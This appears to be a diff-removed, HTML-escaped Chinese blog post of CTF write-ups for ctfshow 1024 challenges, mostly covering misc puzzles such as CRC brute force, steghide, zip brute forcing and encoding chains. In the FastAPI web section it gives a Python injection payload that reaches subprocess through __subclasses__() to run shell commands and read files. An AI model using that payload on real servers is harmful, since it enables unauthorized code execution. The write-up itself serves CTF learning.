-&lt;th style=&#34;text-align:center&#34;&gt;&lt;/th&gt;
-&lt;/tr&gt;
-&lt;/thead&gt;
-&lt;tbody&gt;
-&lt;tr&gt;
-&lt;td style=&#34;text-align:center&#34;&gt;function:ctfshow_1024 support&lt;/td&gt;
-&lt;td style=&#34;text-align:center&#34;&gt;enabled&lt;/td&gt;
-&lt;/tr&gt;
-&lt;/tbody&gt;
-&lt;/table&gt;
-&lt;p&gt;直接传参获得flag。&lt;/p&gt;
-&lt;h2 id=&#34;1024_fastapi&#34;&gt;1024_fastapi&lt;/h2&gt;
-&lt;blockquote&gt;
-&lt;p&gt;FastAPI 介绍：&lt;br&gt;
-      FastAPI是一个&lt;strong&gt;Python&lt;/strong&gt;编写的高性能web框架。&lt;br&gt;
-      FastAPI这个Python Web框架并没有带渲染的网页模板引擎&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p&gt;看到Python就想到SSTI，接下来寻找利用点，扫一波目录，发现&lt;code&gt;/docs&lt;/code&gt;路由，POST传值访问&lt;code&gt;/cccalccc&lt;/code&gt;，回显Json数据：&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;res:  1&lt;br&gt;
-err:  false&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p&gt;尝试常规SSTI套路，发现&lt;code&gt;{{}}{%%}&lt;/code&gt;都会让err为True，而正常输入字符串却不会，这里确实不知道渲染模板引擎是啥，所以可能是eval或者exec等函数的命令执行。&lt;/p&gt;
-&lt;p&gt;但是在使用&lt;code&gt;&amp;quot;&amp;quot;.__class__&lt;/code&gt;时又会引起&lt;code&gt;Internal Server Error&lt;/code&gt;，可能是因为数据类型的原因，使用函数str转换类型&lt;code&gt;str(&amp;quot;&amp;quot;.__class__)&lt;/code&gt;，果然可以。&lt;/p&gt;
-&lt;p&gt;payload&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
-&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
-&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 太离谱了，用了wp的payload居然打不通&lt;/span&gt;
-&lt;span class=&#34;nb&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;vm&#34;&gt;__class__&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;__base__&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;__subclasses__&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;220&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;](&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;cat main.py&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;shell&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;bp&#34;&gt;True&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;stdout&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;communicate&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;strip&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;())&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
-&lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;读源文件获得hint：&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;hint = &amp;quot;flag is in /mnt/f1a9,try to read it&amp;quot;&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p&gt;上面payload读取即可。&lt;/p&gt;
-&lt;h1 id=&#34;misc&#34;&gt;Misc&lt;/h1&gt;
-&lt;h2 id=&#34;1024_签到&#34;&gt;1024_签到&lt;/h2&gt;
-&lt;p&gt;给了两份txt文件，一份题目一份hint：&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;地图，各个路口的编号，flag遗落在其中了，flag路口的编号是连续的&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p&gt;题目数据分为四个部分：&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;第一个是当前路口编号&lt;/li&gt;
-&lt;li&gt;第二个是下一个路口编号&lt;/li&gt;
-&lt;li&gt;第三个不知道&lt;/li&gt;
-&lt;li&gt;第四个是当前路口的字符串&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;      根据&lt;strong&gt;flag路口编号连续&lt;/strong&gt;的hint，那么可以推测&lt;u&gt;flag字段被编号拆分导致无法直接查找flag关键字&lt;/u&gt;，结合&lt;code&gt;flag{xxx}&lt;/code&gt;的结构，依次查找&lt;code&gt;&#39;fla&#39;&#39;fl&#39;&lt;/code&gt;......总会找到的（😓。&lt;/p&gt;
-&lt;h2 id=&#34;1024_重新签到&#34;&gt;1024_重新签到&lt;/h2&gt;
-&lt;p&gt;给了一个hint：&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;你需要一关一关过，如果你能直接flag，就当我没说过。&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p&gt;不走寻常路的我必然要去看一下最后一关，打开压缩包，看到备注：&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;The password is 32 bits.&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p&gt;没啥想法，回第一关。&lt;/p&gt;
-&lt;h3 id=&#34;第一关&#34;&gt;第一关&lt;/h3&gt;
-&lt;p&gt;这一关有两个坑：&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;压缩包hex内容中的&lt;code&gt;It&#39;s all numbers&lt;/code&gt;还以为是压缩包密码，结果是txt文件内容&lt;/li&gt;
-&lt;li&gt;txt文件内容是以&lt;code&gt;000&lt;/code&gt;开头的，谁crc爆破数字会在前面加这么一串0，这河里吗？&lt;/li&gt;
-&lt;/ul&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
-&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
-&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# /bin/bash/env python3&lt;/span&gt;
-&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;binascii&lt;/span&gt;
-&lt;span class=&#34;n&#34;&gt;crc&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;0x342F0E5C&amp;#39;&lt;/span&gt;
-&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1000000&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;10000000&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
-    &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;000&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;bytes&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;encode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;())&lt;/span&gt;
-    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;binascii&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;crc32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;crc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:],&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;16&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
-        &lt;span class=&#34;k&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
-        &lt;span class=&#34;k&#34;&gt;break&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
-&lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;获得第二关的密码：&lt;code&gt;0009656856&lt;/code&gt;。&lt;/p&gt;
-&lt;h3 id=&#34;第二关&#34;&gt;第二关&lt;/h3&gt;
-&lt;p&gt;steghide隐写(怎么知道的？一个个试呗，当然我是看wp的，嘿嘿嘿)&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
-&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
-&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;steghide info level_2.jpg -p &lt;span class=&#34;m&#34;&gt;0009656856&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# 查看隐写信息，确认加密&lt;/span&gt;
-steghide extract -sf level_2.jpg -p &lt;span class=&#34;m&#34;&gt;0009656856&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# 提取隐藏文件&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
-&lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;得到txt文本：&lt;code&gt;密码是什么呀&lt;/code&gt;。&lt;/p&gt;
-&lt;h3 id=&#34;第三关&#34;&gt;第三关&lt;/h3&gt;
-&lt;p&gt;      由压缩包备注32联想到md5，然后将&lt;code&gt;什么呀&lt;/code&gt;md5方法都试一遍都不行，结果32是出题人的一个坑，最终要用sha1加密解压获得flag。。。&lt;/p&gt;
-&lt;p&gt;这一套脑洞下来我无话可说。&lt;/p&gt;
-&lt;h2 id=&#34;1024_兔耳&#34;&gt;1024_兔耳&lt;/h2&gt;
-&lt;p&gt;      根据&lt;code&gt;最强菜鸡&lt;/code&gt;@&lt;a href=&#34;https://lazzzaro.github.io/&#34;&gt;Lazzaro&lt;/a&gt;师傅wp思路，内容中必定含&lt;code&gt;flag&lt;/code&gt;或&lt;code&gt;FLAG&lt;/code&gt;关键字，找到&lt;code&gt;..-. .-.. .- --.&lt;/code&gt;特征的一段，接着后面就是flag值。&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;找不出来，伸手党准备就绪&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;h2 id=&#34;1024_非常简单&#34;&gt;1024_非常简单&lt;/h2&gt;
-&lt;p&gt;      图片分离zip，解压获得一个压缩包一个txt。&lt;/p&gt;
-&lt;p&gt;txt内容：&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;当初的老人机打字就很难受&lt;br&gt;
-&lt;a href=&#34;http://www.keyfc.net/bbs/tools/tudoucode.aspx&#34;&gt;与佛论禅&lt;/a&gt;，解密得&lt;code&gt;99994433777744644462&lt;/code&gt;&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p&gt;      结合老人机和一串数字，联想到&lt;strong&gt;9键输入法&lt;/strong&gt;，然后得到&lt;code&gt;zheshmima&lt;/code&gt;解开加密压缩包，里面有一个flag压缩包和一个txt文件，txt文件名：&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;你怕蛇吗&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p&gt;      看到这个的时候想到了BUU刷到的一道Misc题，考点是&lt;code&gt;Serpent加密&lt;/code&gt;。现在只有一个要素无法完成解密，转去题目的另一个压缩包&lt;code&gt;6.zip&lt;/code&gt;。&lt;/p&gt;
-&lt;p&gt;又碰到个脑洞：6是&lt;strong&gt;6个数字&lt;/strong&gt;的意思，所以要爆破。。。&lt;/p&gt;
-&lt;p&gt;爆破密码：&lt;code&gt;917621&lt;/code&gt;，&lt;/p&gt;
-&lt;p&gt;得到txt，内容：&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;这是杀手锏&lt;br&gt;
-&amp;lt;oF[m{4O;)UQk-6R?9T13KX7:,Q:+)D_4Hu-=#6ZV(M(2&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p&gt;&lt;a href=&#34;https://github.com/Gu-f/py3base92&#34;&gt;py3base92&lt;/a&gt;或&lt;strong&gt;pip2 install base92&lt;/strong&gt;或&lt;a href=&#34;http://ctf.ssleye.com/base92.html&#34;&gt;base92编码(在线)&lt;/a&gt; + base64解码 + Morse解码，得到&lt;code&gt;the end&lt;/code&gt;。&lt;/p&gt;
-&lt;p&gt;加上之前的txt内容，&lt;a href=&#34;http://serpent.online-domain-tools.com/&#34;&gt;Serpent&lt;/a&gt;文件解密，然后解压得flag。&lt;/p&gt;
-&lt;h2 id=&#34;1024_1024zip套娃&#34;&gt;1024_1024zip套娃&lt;/h2&gt;
-&lt;p&gt;带密码的zip套娃，且密码由1024四个数字组成，使用脚本爆破。&lt;/p&gt;
-&lt;p&gt;由于已经知道内容在1024.txt中，就不继续向下爆破了。(脚本修改自&lt;code&gt;最强菜鸡&lt;/code&gt;@&lt;a href=&#34;https://lazzzaro.github.io/&#34;&gt;Lazzaro&lt;/a&gt;师傅)&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
-&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
-&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;zipfile&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;os&lt;/span&gt;
-&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;itertools&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;permutations&lt;/span&gt;
-&lt;span class=&#34;c1&#34;&gt;# 排列组合&lt;/span&gt;
-&lt;span class=&#34;n&#34;&gt;passwd&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;password&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;list&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;permutations&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;0124&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)),&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[]&lt;/span&gt;
-&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;passwd&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;password&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;append&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;join&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
-&lt;span class=&#34;k&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;[*]Password is ready...&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;[*]Brute-force starts...&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
-&lt;span class=&#34;c1&#34;&gt;# 爆破&lt;/span&gt;
-&lt;span class=&#34;nb&#34;&gt;file&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;1024.zip&amp;#39;&lt;/span&gt;
-&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1024&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
-&lt;span class=&#34;c1&#34;&gt;# while True:&lt;/span&gt;
-    &lt;span class=&#34;n&#34;&gt;zfile&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;zipfile&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ZipFile&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;file&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
-    &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;password&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
-        &lt;span class=&#34;k&#34;&gt;try&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
-            &lt;span class=&#34;n&#34;&gt;zfile&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;extractall&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;members&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;zfile&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;namelist&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(),&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pwd&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;encode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;utf-8&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
-            &lt;span class=&#34;n&#34;&gt;zfile&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;close&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
-            &lt;span class=&#34;k&#34;&gt;try&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
-                &lt;span class=&#34;n&#34;&gt;os&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;remove&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;file&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
-            &lt;span class=&#34;k&#34;&gt;except&lt;/span&gt; &lt;span class=&#34;ne&#34;&gt;OSError&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;as&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
-                &lt;span class=&#34;k&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
-            &lt;span class=&#34;n&#34;&gt;files&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;os&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;listdir&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
-            &lt;span class=&#34;c1&#34;&gt;# print(files)&lt;/span&gt;
-            &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;f&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;files&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
-                &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;endswith&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;.zip&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;and&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;f&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;file&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
-                    &lt;span class=&#34;nb&#34;&gt;file&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;f&lt;/span&gt;
-                    &lt;span class=&#34;k&#34;&gt;break&lt;/span&gt;
-            &lt;span class=&#34;k&#34;&gt;break&lt;/span&gt;
-        &lt;span class=&#34;k&#34;&gt;except&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
-            &lt;span class=&#34;k&#34;&gt;pass&lt;/span&gt;
-    &lt;span class=&#34;k&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;[*]unzip &amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;file&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
-&lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;1024.txt内容解码：&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;hex + hex + b64 + b32 + hex + b64 + hex + b64 + hex + b32 + b32 + hex + b64 + unzip&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p&gt;得到flag。&lt;/p&gt;
